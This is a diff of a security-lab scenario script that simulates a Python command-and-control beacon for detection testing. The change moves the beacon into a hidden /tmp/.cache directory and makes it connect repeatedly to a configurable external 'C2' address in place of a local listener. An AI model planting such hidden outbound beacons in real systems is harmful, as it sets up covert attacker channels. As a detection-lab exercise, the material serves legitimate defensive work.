@@ -1,18 +1,17 @@
 #!/usr/bin/env bash
-# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
+# attack（窗口内）：回连脚本落盘，解释器周期执行（多次外连）。
 set -euo pipefail
-HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
-# T1059.006：Python 解释器执行驻留回连脚本
-cat > beacon.py <<'PY'
+C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
+cat > /tmp/.cache/beacon/beacon.py <<PY
 import socket, time
 for _ in range(3):
     try:
-        s = socket.create_connection(("127.0.0.1", 8443), timeout=3)
-        s.sendall(b"secval-beacon")
+        s = socket.create_connection(("$C2_IP", 8443), timeout=3)
+        s.sendall(b"beacon")
         time.sleep(1.5)
         s.close()
     except OSError:
         pass
     time.sleep(1)
 PY
-"$HERE/common/with_listener.sh" 8443 python3 beacon.py
+python3 /tmp/.cache/beacon/beacon.py
